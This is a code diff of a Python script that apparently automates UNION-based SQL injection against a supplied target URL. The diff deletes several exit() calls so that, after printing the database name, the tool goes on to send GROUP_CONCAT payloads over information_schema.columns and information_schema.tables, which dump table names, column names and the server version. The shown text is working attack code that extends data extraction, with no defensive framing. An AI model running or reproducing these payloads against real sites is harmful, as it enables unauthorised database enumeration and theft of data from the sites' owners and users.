@@ -777,7 +777,6 @@ if target_url:
                                         print("----------------------")
                                         print(f"| {database_all} |")
                                         print("-----------------------")
-                                        exit()
                                         payload_4 = "(SELECT+GROUP_CONCAT(table_name,'::',column_name,'::',version()+SEPARATOR+'<br>')+FROM+information_schema.columns)"
                                         rm = re.sub(r"\b{}\b".format(num_countss), payload_4, payload)
                                         results_get_queries = requests.get(target_url + rm)
@@ -799,7 +798,6 @@ if target_url:
                                         print("----------------------")
                                         print(f"| {database_all} |")
                                         print("-----------------------")
-                                        exit()
                                         payload_4 = "(SELECT+GROUP_CONCAT(table_name,'::',version()+SEPARATOR+'<br>')+FROM+information_schema.tables)"
                                         rm = re.sub(r"\b{}\b".format(num_countss), payload_4, payload)
                                         results_get_queries = requests.get(target_url + rm)
@@ -821,7 +819,6 @@ if target_url:
                                         print("----------------------")
                                         print(f"| {database_all} |")
                                         print("-----------------------")
-                                        exit()
                                     else:
                                         print("[INFO] Testing Count Columns : {}".format(num_countss))
                                     
@@ -1556,7 +1553,6 @@ if target_url:
                                         print("----------------------")
                                         print(f"| {database_all} |")
                                         print("-----------------------")
-                                        exit()
                                         payload_4 = "(SELECT+GROUP_CONCAT(table_name,'::',column_name,'::',version()+SEPARATOR+'<br>')+FROM+information_schema.columns)"
                                         rm = re.sub(r"\b{}\b".format(num_countss), payload_4, payload)
                                         results_get_queries = requests.get(target_url + rm)
@@ -1578,7 +1574,6 @@ if target_url:
                                         print("----------------------")
                                         print(f"| {database_all} |")
                                         print("-----------------------")
-                                        exit()
                                         payload_4 = "(SELECT+GROUP_CONCAT(table_name,'::',version()+SEPARATOR+'<br>')+FROM+information_schema.tables)"
                                         rm = re.sub(r"\b{}\b".format(num_countss), payload_4, payload)
                                         results_get_queries = requests.get(target_url + rm)
@@ -1600,7 +1595,6 @@ if target_url:
                                         print("----------------------")
                                         print(f"| {database_all} |")
                                         print("-----------------------")
-                                        exit()
                                     else:
                                         print("[INFO] Testing Count Columns : {}".format(num_countss))
         
